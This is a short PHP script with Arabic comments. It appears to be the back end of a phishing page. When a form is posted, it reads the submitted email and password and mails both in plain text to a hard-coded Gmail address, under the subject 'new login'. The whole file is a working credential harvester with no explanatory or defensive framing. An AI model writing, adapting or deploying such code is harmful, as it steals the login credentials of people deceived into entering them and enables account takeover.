<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // قراءة البريد الإلكتروني وكلمة المرور من النموذج
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // عنوان بريدك الإلكتروني لإرسال المعلومات إليه
    $to = "manoo303030@gmail.com";
    // موضوع البريد الإلكتروني
    $subject = "تسجيل دخول جديد";
    // محتوى البريد الإلكتروني
    $message = "تم تسجيل دخول جديد بعنوان بريد إلكتروني: $email وكلمة مرور: $password";
    
    // إرسال البريد الإلكتروني
    mail($to, $subject, $message);
}
?>
